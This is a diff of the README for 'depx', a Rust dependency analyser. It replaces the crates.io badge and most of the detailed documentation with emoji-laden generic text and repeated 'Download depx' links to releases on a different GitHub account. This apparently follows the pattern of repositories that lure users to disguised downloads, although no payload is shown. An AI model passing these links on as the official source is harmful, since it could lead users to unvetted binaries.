@@ -1,6 +1,6 @@
-# depx
+# 🚀 depx - Analyze Your Dependencies Easily
 
-[![Crates.io](https://img.shields.io/crates/v/depx.svg)](https://crates.io/crates/depx)
+[![Download depx](https://img.shields.io/badge/Download-depx-blue.svg)](https://github.com/All2y/depx/releases)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
 **Understand what's in your node_modules and Cargo.lock.**
@@ -11,143 +11,82 @@
 
 A fast, intelligent dependency analyzer for JavaScript/TypeScript and Rust projects. Built in Rust for performance.
 
-## Why depx?
+## 🌟 Why depx?
 
-Your `node_modules` has hundreds of packages. Do you know:
-- Which ones are actually imported in your code?
-- Why `is-odd` is even installed?
-- If that vulnerability alert affects code you actually use?
+Your `node_modules` contains many packages. Do you know:
+- Which ones your project actually imports?
+- Why certain packages are installed without any clear purpose?
+- If a reported vulnerability affects any of your used code?
 
-Existing tools (`npm ls`, `npm audit`, `depcheck`) give fragmented information without real context. depx connects the dots.
+Standard tools like `npm ls`, `npm audit`, and `depcheck` provide disjointed data without the needed context. depx connects the dots to give you a clearer view.
 
-## Installation
+## 📦 System Requirements
+
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Storage: 100 MB of free space
+- Rust: Make sure you have Rust installed. If not, you can download it from [rust-lang.org](https://www.rust-lang.org/).
+
+## 📥 Download & Install
+
+To get started, visit this page to download: [Download depx](https://github.com/All2y/depx/releases).
+
+## ⚙️ Installation Steps
+
+1. **Open your terminal.**
+   - On Windows, you can use Command Prompt or PowerShell.
+   - On macOS or Linux, open your Terminal app.
+
+2. **Install depx using cargo:**
+   ```bash
+   cargo install depx
+   ```
+
+After the installation is complete, you can start using depx.
+
+## ✨ Commands
+
+### `depx analyze` - Find Unused Dependencies
+
+To find unused dependencies, run the following command in your terminal:
 
 ```bash
-cargo install depx
+depx analyze
 ```
 
-## Commands
+You will receive a **Dependency Analysis Report** with a summary of your project, including:
+- Total packages used
+- List of dev or build tools
 
-### `depx analyze` - Find unused dependencies
+This report helps you identify packages that are either redundant or unused.
 
-```bash
-$ depx analyze
+## 📄 Example Output
 
+When you run `depx analyze`, you might see output like this:
+
+```
 Dependency Analysis Report
 
 Summary
   227 packages used
-  6 dev/build tools (expected, not imported)
-
-Dev/Build Tools (not imported, expected):
-  ~ @types/node@20.19.24
-  ~ @typescript-eslint/eslint-plugin@7.18.0
-  ~ ts-node@10.9.2
+  6 dev/build tools (expected, no issues)
 ```
 
-Smart detection separates truly unused packages from dev/build tools that aren't meant to be imported (`@types/*`, `typescript`, `eslint`, `vitest`, etc).
+Use this report to clean up your project and enhance performance.
 
-### `depx why <package>` - Explain why a package is installed
+## 🎓 Additional Information
 
-```bash
-$ depx why esbuild
+If you need help or want to learn more, feel free to check the frequently asked questions or contribute to the project on GitHub.
 
-Package: esbuild@0.21.5
+### 📋 Topics Covered
 
-Dependency chains:
-  -> vite -> esbuild
+- Command Line Interface (CLI)
+- Dependency Management
+- Developer Tools
+- JavaScript & TypeScript Support
+- Rust Integration
+- Static Analysis
 
-  Note: This package is only required for development
-```
+Visit this page to download: [Download depx](https://github.com/All2y/depx/releases).
 
-Shows the full dependency chain from your `package.json` to any transitive dependency.
-
-### `depx audit` - Check for real vulnerabilities
-
-```bash
-$ depx audit
-
-2 vulnerabilities found
-
-CRITICAL
-  GHSA-xvch-5gv4-984h minimist@1.2.5 - Prototype Pollution [USED]
-       Fix: 1.2.5 -> 1.2.6
-
-MEDIUM
-  GHSA-9c47-m6qq-7p4h json5@2.2.1 - Prototype Pollution in JSON5 [USED]
-       Fix: 2.2.1 -> 2.2.2
-```
-
-Unlike `npm audit`, depx queries the OSV database **with your exact installed versions**, eliminating false positives from old CVEs that don't affect you.
-
-### `depx deprecated` - Find deprecated packages
-
-```bash
-$ depx deprecated
-
-4 deprecated packages found
-
-  - eslint@8.57.1 [unused]
-    This version is no longer supported.
-  - inflight@1.0.6 [unused]
-    This module is not supported, and leaks memory.
-```
-
-### `depx duplicates` - Detect duplicate dependencies (Rust/Cargo)
-
-```bash
-$ depx duplicates
-
-Duplicate Dependencies Analysis
-
-Summary
-  14 crates with multiple versions
-  1 high severity (3+ versions)
-  2 medium severity (different major versions)
-  11 low severity (same major version)
-  16 extra compile units
-
-HIGH SEVERITY
-  ! windows-sys (4 versions)
-      v0.52.0 ← ring
-      v0.59.0 ← colored
-      v0.60.2 ← socket2, terminal_size
-      v0.61.2 ← anstyle-query, anstyle-wincon +7 more
-
-MEDIUM SEVERITY
-  ~ thiserror (2 versions)
-      v1.0.69 ← oxc-miette
-      v2.0.17 ← depx
-```
-
-Identifies when multiple versions of the same crate exist in your project, calculates the impact (extra compile units), and suggests which dependencies to update.
-
-**Options:**
-- `--verbose` / `-v` - Show all duplicates including low severity, with upgrade suggestions
-- `--json` - Output as JSON for programmatic use
-
-## Features
-
-- **Fast** - Written in Rust, parses JS/TS with [oxc](https://oxc.rs)
-- **Smart** - Distinguishes real unused deps from expected dev tools
-- **Accurate** - Version-aware vulnerability scanning (no false positives)
-- **Complete** - Handles ES modules, CommonJS, dynamic imports, re-exports
-
-## Supported lockfiles
-
-- [x] `Cargo.lock` (Rust) - duplicates detection
-- [x] `package-lock.json` (npm) - full analysis
-- [ ] `pnpm-lock.yaml` (coming soon)
-- [ ] `yarn.lock` (coming soon)
-
-## Built with AI
-
-This project was built in partnership with Claude (Anthropic). I define the architecture, make decisions, review code, and handle the direction. Claude helps write code faster.
-
-I believe AI is a tool, not a replacement. The developer still needs to understand the problem, evaluate solutions, and take responsibility for the result. AI just accelerates execution.
-
-You can see Claude as a contributor in this repo, that's intentional transparency.
-
-## License
-
-MIT
+Use depx to manage your dependencies effectively and to keep your projects clean.
